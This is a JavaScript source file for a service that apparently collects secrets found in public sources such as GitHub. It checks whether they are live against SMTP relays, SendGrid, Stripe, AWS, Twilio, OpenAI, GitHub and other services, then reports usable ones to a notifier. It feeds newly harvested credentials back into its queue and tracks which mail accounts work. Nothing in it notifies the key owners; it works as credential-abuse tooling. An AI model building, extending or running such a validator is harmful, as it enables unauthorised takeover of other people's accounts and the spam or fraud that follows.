import { appendFileSync, mkdirSync, readFileSync } from "node:fs";
import { dirname } from "node:path";
import { builtinHandlers } from "./handlers.js";
import { harvestedToHits } from "./github-harvest.js";
import { collectMailEnv, credentialFingerprints, formatMailBlock, isFullSendGridKey, isStripeSecret, isUsableSmtp, smtpAccountKey, shouldHoldSmtpInvalid, smtpApiRoute, } from "./smtp-env.js";
import { collectTwilioCreds } from "./twilio.js";
import { collectSalesforceEnv, salesforceFingerprint } from "./salesforce-env.js";
import { azureFingerprint, collectAzureEnv } from "./azure-env.js";
import { collectZohoEnv, zohoFingerprint } from "./zoho-env.js";
export class ValidatorService {
    http;
    notifier;
    bus;
    logger;
    workers;
    queue = [];
    seen = new Set();
    active = 0;
    draining = null;
    handlers = new Map();
    running = true;
    persistFile;
    smtpPending = new Map();
    smtpDeferred = new WeakSet();
    constructor(http, notifier, bus, logger, workers, extra = [], persistFile, smtpAuthMs = 10_000) {
        this.http = http;
        this.notifier = notifier;
        this.bus = bus;
        this.logger = logger;
        this.workers = workers;
        this.persistFile = persistFile;
        this.loadSeen();
        for (const h of [...builtinHandlers(http, smtpAuthMs), ...extra]) {
            this.handlers.set(h.service, h);
        }
        for (let i = 0; i < workers; i++)
            this.loop();
    }
    register(handler) {
        this.handlers.set(handler.service, handler);
    }
    submit(hit) {
        const keys = credentialFingerprints(hit);
        if (!keys.length)
            return;
        if (keys.every((k) => this.seen.has(k)))
            return;
        const fresh = keys.filter((k) => !this.seen.has(k));
        for (const k of keys)
            this.seen.add(k);
        this.persistKeys(fresh);
        this.queue.push(hit);
        this.noteSmtpPending(hit, 1);
    }
    async drain() {
        this.draining = this.draining ?? this.waitEmpty();
        await this.draining;
        this.draining = null;
    }
    async waitEmpty() {
        while (this.queue.length > 0 || this.active > 0) {
            await new Promise((r) => setTimeout(r, 50));
        }
    }
    async loop() {
        while (this.running) {
            const hit = this.queue.shift();
            if (!hit) {
                await new Promise((r) => setTimeout(r, 25));
                continue;
            }
            this.active++;
            try {
                await this.validate(hit);
            }
            catch (err) {
                this.logger.error("VALIDATOR", `panic ${err.message}`);
            }
            finally {
                this.active--;
            }
        }
    }
    async validate(hit) {
        let smtpHeld = false;
        try {
            const byService = groupMatches(hit.matches);
            const env = hit.matches[0] ? collectMailEnv(hit, hit.matches[0], hit.matches) : {};
            const route = smtpApiRoute(env);
            const notified = new Set();
            for (const [service, matches] of byService) {
                if (isSmtpFamily(service) && route)
                    continue;
                if (service === "sendgrid" && !matches.some((m) => isFullSendGridKey(m.value)))
                    continue;
                if (isSmtpFamily(service) && !isUsableSmtp(env))
                    continue;
                const handler = this.handlers.get(service);
                const primary = pickPrimary(service, matches);
                const fp = notifyKey(service, primary, env, hit);
                if (!fp || notified.has(fp) || this.seen.has(`sent:${fp}`))
                    continue;
                if (isSmtpFamily(service) &&
                    this.smtpDeferred.has(hit) &&
                    this.seen.has(`smtp-ok:${smtpAccountKey(env)}`)) {
                    continue;
                }
                let result;
                if (handler) {
                    result = await handler.validate(hit, primary, hit.matches);
                }
                else {
                    result = { service, valid: false, raw: true, details: "pas de validateur" };
                }
                if (result.meta?.skipNotify === "1")
                    continue;
                if (isSmtpFamily(service)) {
                    const gate = this.gateSmtpNotify(hit, env, result);
                    if (gate === "defer") {
                        smtpHeld = true;
                        continue;
                    }
                    if (gate === "skip")
                        continue;
                }
                if (service === "sendgrid" && smtpApiRoute(env) === "sendgrid") {
                    result = { ...result, meta: { ...result.meta, envBlock: formatMailBlock(env) } };
                }
                await this.emitHit(hit, matches, result, fp, notified);
                this.enqueueHarvested(result);
            }
            if (route && !notified.has(routeKey(route, env))) {
                await this.validateRoutedSmtp(hit, env, route, notified);
            }
        }
        finally {
            if (!smtpHeld)
                this.noteSmtpPending(hit, -1);
        }
    }
    gateSmtpNotify(hit, env, result) {
        if (result.raw)
            return "emit";
        const acct = smtpAccountKey(env);
        if (!acct || acct.endsWith(":") || acct.startsWith(":"))
            return "emit";
        if (result.valid) {
            this.seen.add(`smtp-ok:${acct}`);
            this.persistKeys([`smtp-ok:${acct}`]);
            return "emit";
        }
        const hold = shouldHoldSmtpInvalid({
            alreadyValid: this.seen.has(`smtp-ok:${acct}`),
            alreadyNotifiedAccount: this.seen.has(`sent:smtp-acct:${acct}`),
            otherPending: this.smtpPending.get(acct) ?? 1,
            alreadyDeferred: this.smtpDeferred.has(hit),
        });
        if (hold === "defer") {
            this.smtpDeferred.add(hit);
            this.queue.push(hit);
            return "defer";
        }
        if (hold === "skip")
            return "skip";
        this.seen.add(`sent:smtp-acct:${acct}`);
        this.persistKeys([`sent:smtp-acct:${acct}`]);
        return "emit";
    }
    noteSmtpPending(hit, delta) {
        if (!hit.matches.some((x) => isSmtpFamily(x.service.endsWith(".host") ? x.service.slice(0, -5) : x.service))) {
            return;
        }
        if (!hit.matches[0])
            return;
        const env = collectMailEnv(hit, hit.matches[0], hit.matches);
        if (!isUsableSmtp(env))
            return;
        const acct = smtpAccountKey(env);
        if (!acct || acct.endsWith(":") || acct.startsWith(":"))
            return;
        const next = (this.smtpPending.get(acct) ?? 0) + delta;
        if (next <= 0)
            this.smtpPending.delete(acct);
        else
            this.smtpPending.set(acct, next);
    }
    async validateRoutedSmtp(hit, env, route, notified) {
        const pass = env.MAIL_PASSWORD?.trim() ?? "";
        if (route === "sendgrid" && !isFullSendGridKey(pass))
            return;
        if (!pass)
            return;
        const fp = routeKey(route, env);
        if (!fp || notified.has(fp) || this.seen.has(`sent:${fp}`))
            return;
        const handler = this.handlers.get(route);
        const primary = {
            service: route,
            value: pass,
            context: hit.matches[0]?.context ?? "",
            lineNumber: hit.matches[0]?.lineNumber ?? 0,
            patternName: "MAIL_PASSWORD",
        };
        const validated = handler
            ? await handler.validate(hit, primary, hit.matches)
            : { service: route, valid: false, raw: true, details: "pas de validateur" };
        await this.emitHit(hit, [primary], { ...validated, meta: { ...validated.meta, envBlock: formatMailBlock(env) } }, fp, notified);
    }
    async emitHit(hit, matches, result, fp, notified) {
        const status = result.raw ? "raw" : result.valid ? "valid" : "invalid";
        const validated = {
            ...hit,
            matches,
            validationStatus: status,
            validationDetails: result.details,
            validationError: result.error,
            validationMeta: result.meta,
        };
        this.logger.info("VALIDATOR", `${status} ${result.service} from ${hit.source} ${hit.url}`);
        this.bus.emit("hit.validated", { hit: validated, status, details: result.details });
        notified.add(fp);
        this.seen.add(`sent:${fp}`);
        this.persistKeys([`sent:${fp}`]);
        await this.notifier.sendHit(validated);
    }
    enqueueHarvested(result) {
        for (const hit of harvestedToHits(result.harvested ?? [])) {
            this.submit(hit);
        }
    }
    loadSeen() {
        if (!this.persistFile)
            return;
        try {
            const text = readFileSync(this.persistFile, "utf8");
            for (const line of text.split(/\r?\n/)) {
                const k = line.trim();
                if (k)
                    this.seen.add(k);
            }
            this.logger.info("VALIDATOR", `seen_keys ${this.seen.size} from ${this.persistFile}`);
        }
        catch {
            /* first run */
        }
    }
    persistKeys(keys) {
        if (!this.persistFile || !keys.length)
            return;
        try {
            mkdirSync(dirname(this.persistFile), { recursive: true });
            appendFileSync(this.persistFile, keys.map((k) => `${k}\n`).join(""), "utf8");
        }
        catch (err) {
            this.logger.warn("VALIDATOR", `seen_keys persist ${err.message}`);
        }
    }
}
function groupMatches(matches) {
    const m = new Map();
    for (const x of matches) {
        const service = x.service.endsWith(".host") ? x.service.slice(0, -5) : x.service;
        const list = m.get(service) ?? [];
        list.push(x);
        m.set(service, list);
    }
    return m;
}
function pickPrimary(service, matches) {
    if (service === "openai") {
        return matches.find((x) => x.value.startsWith("sk-")) ?? matches[0];
    }
    if (service === "stripe") {
        return matches.find((x) => isStripeSecret(x.value)) ?? matches[0];
    }
    if (service === "twilio") {
        return (matches.find((x) => /^AC[0-9a-fA-F]{32}$/.test(x.value)) ??
            matches.find((x) => /^[0-9a-fA-F]{32}$/.test(x.value)) ??
            matches[0]);
    }
    if (service === "smtp" || service === "xsmtp" || service === "emailsmtp") {
        return matches.find((x) => x.value.includes("@") || /pass|user/i.test(x.patternName)) ?? matches[0];
    }
    if (service === "aws") {
        return matches.find((x) => /^A[KS]IA[A-Z0-9]{16}$/.test(x.value)) ?? matches[0];
    }
    if (service === "github") {
        const rank = (v) => /^github_pat_/.test(v) ? 0 : /^ghp_/.test(v) ? 1 : /^gho_/.test(v) ? 2 : /^ghu_/.test(v) ? 3 : /^ghs_/.test(v) ? 9 : 8;
        return [...matches].sort((a, b) => rank(a.value) - rank(b.value))[0];
    }
    return matches[0];
}
function isSmtpFamily(service) {
    return service === "smtp" || service === "xsmtp" || service === "emailsmtp";
}
function notifyKey(service, primary, env, hit) {
    if (service === "sendgrid")
        return `sg:${primary.value.trim()}`;
    if (isSmtpFamily(service)) {
        return `smtp:${env.MAIL_HOST ?? ""}:${env.MAIL_USERNAME ?? ""}:${env.MAIL_PASSWORD ?? ""}`;
    }
    if (service === "twilio" && hit) {
        const c = collectTwilioCreds(hit, primary, hit.matches);
        if (c.sid && c.token)
            return `twilio:${c.sid}:${c.token}`;
    }
    if (service === "salesforce" && hit) {
        const sf = collectSalesforceEnv(hit, primary, hit.matches);
        return salesforceFingerprint(sf) || `sf:${primary.value}`;
    }
    if (service === "azure" && hit) {
        const az = collectAzureEnv(hit, primary, hit.matches);
        return azureFingerprint(az) || `azure:${primary.value}`;
    }
    if (service === "zoho" && hit) {
        const zo = collectZohoEnv(hit, primary, hit.matches);
        return zohoFingerprint(zo) || `zoho:${primary.value}`;
    }
    if (service === "aws" && hit) {
        const k = credentialFingerprints(hit).find((x) => x.startsWith("aws:"));
        if (k)
            return k;
    }
    return `${service}:${primary.value}`;
}
function routeKey(route, env) {
    const pass = env.MAIL_PASSWORD?.trim() ?? "";
    if (route === "sendgrid")
        return `sg:${pass}`;
    if (route === "mailgun")
        return `mg:${pass}`;
    return `brevo:${pass}`;
}
export function dedupKey(hit) {
    return credentialFingerprints(hit).sort().join("|");
}
export { builtinHandlers, credentialFingerprints };
